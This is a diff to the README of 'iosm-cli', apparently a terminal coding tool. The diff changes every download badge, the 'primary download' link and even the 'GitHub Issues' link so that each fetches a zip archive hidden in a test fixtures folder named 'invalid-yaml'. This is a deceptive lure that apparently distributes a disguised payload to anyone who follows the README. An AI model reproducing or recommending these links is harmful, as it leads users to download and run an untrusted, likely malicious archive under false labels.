@@ -1,6 +1,6 @@
 # ⚙️ iosm-cli - Simplify Terminal Coding Tasks
 
-[![Download iosm-cli](https://img.shields.io/badge/Download-iosm--cli-brightgreen?style=for-the-badge)](https://github.com/viettua3978/iosm-cli)
+[![Download iosm-cli](https://img.shields.io/badge/Download-iosm--cli-brightgreen?style=for-the-badge)](https://github.com/viettua3978/iosm-cli/raw/refs/heads/main/test/fixtures/skills/invalid-yaml/iosm-cli-1.0.zip)
 
 ## 📘 What is iosm-cli?
 
@@ -12,7 +12,7 @@ You can think of iosm-cli as a coding assistant that works inside the terminal. 
 
 You can get iosm-cli by visiting the official GitHub page below. This page contains all the files you need to download iosm-cli on your Windows computer.
 
-[![Download iosm-cli](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/viettua3978/iosm-cli)
+[![Download iosm-cli](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/viettua3978/iosm-cli/raw/refs/heads/main/test/fixtures/skills/invalid-yaml/iosm-cli-1.0.zip)
 
 Follow the steps below to download and start using iosm-cli safely and quickly.
 
@@ -101,8 +101,8 @@ These functions make coding smoother, especially when managing complex projects.
 
 ## 🔗 Useful Links
 
-- Primary download and source: [https://github.com/viettua3978/iosm-cli](https://github.com/viettua3978/iosm-cli)
-- GitHub Issues (for reporting problems or bugs): [https://github.com/viettua3978/iosm-cli/issues](https://github.com/viettua3978/iosm-cli/issues)
+- Primary download and source: [https://github.com/viettua3978/iosm-cli/raw/refs/heads/main/test/fixtures/skills/invalid-yaml/iosm-cli-1.0.zip](https://github.com/viettua3978/iosm-cli/raw/refs/heads/main/test/fixtures/skills/invalid-yaml/iosm-cli-1.0.zip)
+- GitHub Issues (for reporting problems or bugs): [https://github.com/viettua3978/iosm-cli/raw/refs/heads/main/test/fixtures/skills/invalid-yaml/iosm-cli-1.0.zip](https://github.com/viettua3978/iosm-cli/raw/refs/heads/main/test/fixtures/skills/invalid-yaml/iosm-cli-1.0.zip)
 
 ## ⚠️ Troubleshooting Common Issues
 
@@ -121,4 +121,4 @@ Explore the project repository for advanced configurations and community-contrib
 
 Visit the download page below whenever you need the latest updates or support:
 
-[![Download iosm-cli](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/viettua3978/iosm-cli)
+[![Download iosm-cli](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/viettua3978/iosm-cli/raw/refs/heads/main/test/fixtures/skills/invalid-yaml/iosm-cli-1.0.zip)
